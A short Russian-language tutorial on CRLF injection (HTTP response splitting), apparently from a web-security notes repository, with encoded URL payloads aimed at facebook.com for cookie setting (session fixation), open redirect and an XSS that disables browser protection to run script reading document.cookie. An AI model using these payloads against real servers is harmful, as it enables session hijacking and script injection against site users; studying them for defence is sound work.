# Carriage Return Line Feed

Уязвимость веб-серверов, с недостаточной фильтрацией данных пользователя, переданных в **http**-запросе.

Системы, использующие **ASCII**-кодировку, применяют управляющие символы **CR**(0x0D) и **LF**(0x0A) для возврата каретки и перевода строки соответственно.  

Как мы помним **http** протокол (<2.0) - текстовый, где разделение строк происходит как раз символами `\r\n`(=CRLF).  

## Эксплуатация

### Установка кастомных заголовков

Допустим мы имеем уязвимый веб-сервер на хосте `example.com`, который некорректно обрабатывает **Request URI**, то есть декодирует, применяя метасимволы.  

В итоге путь `/%0aSet-Cookie:xxx=xxx%0aX:/%2e%2e/test` будет преобразован в  

    /
    Set-Cookie: xxx=xxx
    X: /../test

Тогда инъекция будет представлять из себя **URL**:  
`www.facebook.com/%0aSet-Cookie:xxx=xxx%0aX:%2f%2e%2e/test`  
позволяя проставить перешедшему по ссылке куку с нужным значением. Так можно применять **Session fixation**, например.  

> Facebook тут не случайно :)

### Open redirect

`www.facebook.com/%2fwww.google.com%2f%2e%2e/`

### XSS

Для проведения **XSS** нужно сломать значение заголовка **Location** в ответе, чтобы не произошло редиректа, после чего можно задать нужный **Content-type**, отключить **XSS** защиту браузера заголовком `X-XSS-Protection: 0` и отбив пустую строку для того, чтобы браузер последующую часть воспринимал как тело ответа.  

То есть  
`www.facebook.com/%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(document.cookie)%3c/script%3e%2F..%2F..%2F..%2F../test`  

Даст  

    HTTP/1.1 301 Moved Permanently
    Location: //xxx:1/
    X-XSS-Protection: 0
    Content-Type: text/html
    Connection: Close

    <script>alert()</script>/../../../../test/
    Content-Type: text/html; charset=utf-8
    Connection: keep-alive ...
    ...

В итоге браузер выполнит `<script>alert()</script>`.

## Защита

* Следить за обновлениями веб-сервера
* Не писать собственные реализации, если ты не Сысоев

[← Назад](../README.md)